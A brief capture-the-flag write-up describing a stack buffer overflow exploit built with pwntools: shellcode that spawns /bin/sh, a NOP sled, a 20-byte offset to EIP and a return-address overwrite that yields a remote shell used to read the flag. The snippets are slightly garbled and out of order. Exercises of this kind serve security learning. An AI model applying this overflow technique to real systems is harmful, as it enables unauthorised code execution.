The first and only flag is achieved with a shell code exploit.

The exploit code to run /bin/sh conveniently provided by pwntools
shellcode = asm(shellcraft.sh())


We can get the location of the stack directly from the program's debug message, and all thats left is to send the explout

payload_shellcode = asm("nop") * 16 + shellcode
p.sendline(payload_shellcode)1


offset_to_eip = 20
exploit_overflow  = b"A" * offset_to_eip
exploit_overflow += p32(shellcode_addr)

at which point we have a remote shell. A quick ls finds flag .txt which we can cat to get the flag
